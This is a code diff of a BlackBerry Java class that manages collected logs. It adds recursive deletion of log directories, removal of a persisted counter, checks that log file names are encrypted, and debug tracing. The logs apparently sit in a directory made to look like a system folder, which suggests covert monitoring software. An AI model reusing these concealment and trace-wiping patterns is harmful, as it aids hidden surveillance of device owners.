@@ -126,6 +126,12 @@ public final class LogCollector implements Singleton {
 
     }
 
+    public synchronized void removeProgressive() {
+        //#debug info
+        debug.info("Removing Progressive");
+        PersistentStore.destroyPersistentObject(PERSISTENCE_KEY);
+    }
+    
     private synchronized int deserializeProgressive() {
         logProgressivePersistent = PersistentStore
                 .getPersistentObject(PERSISTENCE_KEY);
@@ -212,7 +218,7 @@ public final class LogCollector implements Singleton {
         return logProgressive;
     }
 
-    private String makeDateName(final Date date) {
+    private static String makeDateName(final Date date) {
         final long millis = date.getTime();
         final long mask = (long) 1E4;
         final int lodate = (int) (millis % mask);
@@ -240,9 +246,6 @@ public final class LogCollector implements Singleton {
         final int progressive = getNewProgressive();
 
         final Vector vector = new Vector();
-
-        // log.SetProgressive(progressive);
-
         final String basePath = onSD ? Path.SD_PATH : Path.USER_PATH;
 
         final String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
@@ -250,6 +253,11 @@ public final class LogCollector implements Singleton {
 
         final String encName = Encryption.encryptName(fileName + LOG_EXTENSION,
                 keys.getChallengeKey()[0]);
+
+        //#ifdef DBC
+        Check.asserts(!encName.endsWith("MOB"), "makeNewName: not scrambled. "
+                + this);
+        //#endif
 
         vector.addElement(new Integer(progressive));
         vector.addElement(basePath + Path.LOG_DIR_BASE); // file:///SDCard/BlackBerry/system/$RIM313/$1
@@ -282,6 +290,44 @@ public final class LogCollector implements Singleton {
      */
 
     public synchronized void removeLogDirs() {
+        //#debug info
+        debug.info("removeLogDirs");
+        removeLogRecursive(Path.SD_PATH, false);
+        removeLogRecursive(Path.USER_PATH, false);
+    }
+
+    private void removeLogRecursive(String basePath, boolean delete) {
+
+        //#debug info
+        debug.info("RemovingLog: " + basePath);
+
+        FileConnection fc;
+        try {
+            fc = (FileConnection) Connector.open(basePath);
+
+            if (fc.isDirectory()) {
+                final Enumeration fileLogs = fc.list("*",
+                        true);
+
+                while (fileLogs.hasMoreElements()) {
+                    final String file = (String) fileLogs.nextElement();
+
+                    //#debug debug
+                    debug.trace("removeLog: " + file);
+                    removeLogRecursive(basePath + file, true);
+                }
+            }
+            
+            if(delete){
+                fc.delete();
+            }
+            
+            fc.close();
+
+        } catch (final IOException e) {
+            //#debug error
+            debug.error("removeLog: " + basePath + " ex: " + e);
+        }
 
     }
 
@@ -312,6 +358,8 @@ public final class LogCollector implements Singleton {
                     // scanForLogs(dir);
                     // return scanForLogs(file);
                     vector.addElement(dir);
+                    //#debug debug
+                    debug.trace("scanForDirLogs adding: " + dir);
 
                 }
 
@@ -321,9 +369,13 @@ public final class LogCollector implements Singleton {
             fc.close();
 
         } catch (final IOException e) {
-            e.printStackTrace();
+            //#debug error
+            debug.error("scanForDirLogs: " + e);
 
         }
+
+        //#debug debug
+        debug.trace("scanForDirLogs #: " + vector.size());
 
         return vector;
     }
@@ -374,7 +426,8 @@ public final class LogCollector implements Singleton {
             }
 
         } catch (final IOException e) {
-            e.printStackTrace();
+            //#debug error
+            debug.error("scanForLogs: " + e);
 
         } finally {
             if (fcDir != null) {
@@ -387,6 +440,8 @@ public final class LogCollector implements Singleton {
             }
         }
 
+        //#debug debug
+        debug.trace("scanForLogs numDirs: " + vector.size());
         return vector.getValues();
     }
 
